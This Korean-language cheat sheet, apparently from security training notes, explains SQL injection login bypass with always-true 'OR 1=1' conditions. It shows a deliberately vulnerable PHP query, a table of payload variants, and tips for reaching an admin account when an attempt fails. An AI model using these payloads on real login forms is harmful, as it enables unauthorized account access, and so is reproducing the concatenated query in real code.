# OR 1=1: 인증 우회 (Tautology)

## 개요

항상 참인 조건을 WHERE에 주입해 조건 자체를 무력화한다. 주 용도는 로그인 폼 우회다.

## 서버 쿼리와 조립

로그인 폼의 서버 쿼리가 대개 이 모양이다.

```php
$sql = "SELECT * FROM users WHERE user='$user' AND pw='$pw'";
```

`user` 필드에 `' OR 1=1-- -`를 넣으면 쿼리가 이렇게 조립된다.

```sql
SELECT * FROM users WHERE user='' OR 1=1-- -' AND pw=''
```

| 조각 | 역할 |
|---|---|
| `'` | user 문자열을 일찍 닫아 `user=''` 완성 |
| `OR 1=1` | 항상 참인 조건 추가. WHERE 전체가 참 |
| `-- -` | 뒤의 `AND pw=...`를 버려 비밀번호 검증 제거 |

실행되는 쿼리는 `WHERE user='' OR 1=1`이 되어 모든 행이 매칭된다. 애플리케이션이 "조회된 첫 행"으로 로그인시키면 보통 관리자 계정으로 들어간다.

## 변형

| 페이로드 | 상황 |
|---|---|
| `' OR 1=1-- -` | 문자열 컨텍스트 기본형 |
| `' OR 1=1#` | MySQL `#` 주석. URL에서는 `%23`으로 보냄 |
| `' OR '1'='1` | 주석 대신 따옴표 균형으로 닫는 형태 |
| `admin'-- -` | 계정명 확정, 비밀번호 검증만 제거. 특정 계정 노릴 때 |
| `" OR 1=1-- -` | 쿼리가 큰따옴표로 감싸진 경우 |
| ` OR 1=1-- -` | 숫자 컨텍스트(파라미터에 따옴표 없음) |

## 실패하는 경우

- 200 응답인데 로그인이 안 되면: 첫 행이 로그인 대상 계정이 아닐 수 있다. `admin'-- -`로 특정 계정을 노리거나, 조회 행을 고르려면 `OR user='admin'` 식으로 조건을 좁힌다.
- Prepared statement(파라미터 바인딩)면 입력이 문자열 데이터로만 취급되어 무효다.
- 응답 변화가 전혀 없으면 Boolean 기반(blind)으로 전환한다. → [blind_sql.md](./blind_sql.md)
